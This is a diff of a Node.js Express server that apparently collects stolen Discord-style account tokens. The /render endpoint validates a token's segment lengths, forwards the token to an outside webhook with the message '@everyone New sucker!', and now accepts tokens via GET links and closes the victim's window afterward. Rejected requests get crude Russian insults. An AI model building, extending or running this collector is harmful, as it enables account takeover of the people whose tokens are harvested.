@@ -4,17 +4,17 @@ const port = process.env.PORT || 3000
 
 const webhook = process.env.webhook || "example.com";
 
-app.post('/render', async (req,res) => {
-    if (!req.body) { res.status(200).json({code: 200, message: 'Твоя мать 200'})}
-    if (!req.body.xyz) { res.status(200).json({code: 200, message: 'Твоя мать 200'})}
-    if (typeof(req.body.xyz) != "string") { res.status(200).json(JSON.stringify({code: 200, message: 'Твоя мать 200'}))}
+app.get('/render', async (req,res) => {
+    if (!req.query) {  res.send('я твою матушку в кино водил и сладкой ватой угощал') }
+    if (!req.query.xyz) {  res.send('я твою матушку в кино водил и сладкой ватой угощал') }
+    if (typeof(req.query.xyz) != "string") { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
 
-    const token = req.body.xyz
+    const token = req.query.xyz
     const segments = token.split(".")
 
-    if (segments[0].length != 26) { res.status(200).json({code: 200, message: 'Твоя мать 200'})}
-    if (segments[1].length != 6) { res.status(200).json({code: 200, message: 'Твоя мать 200'})}
-    if (segments[2].length != 38) { res.status(200).json({code: 200, message: 'Твоя мать 200'})}
+    if (segments[0].length != 26) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
+    if (segments[1].length != 6) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
+    if (segments[2].length != 38) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
 
     const content = '@everyone Новый лох! \n ```' + token + '```'
 
@@ -24,7 +24,11 @@ app.post('/render', async (req,res) => {
         body: JSON.stringify({ content })
     })
 
-    res.json(JSON.stringify({code: 200, message: 'хехехехе'}))
+    res.send(`
+    <script>
+        window.close()
+    </script>    
+        `) 
 })
 
 app.listen(port)
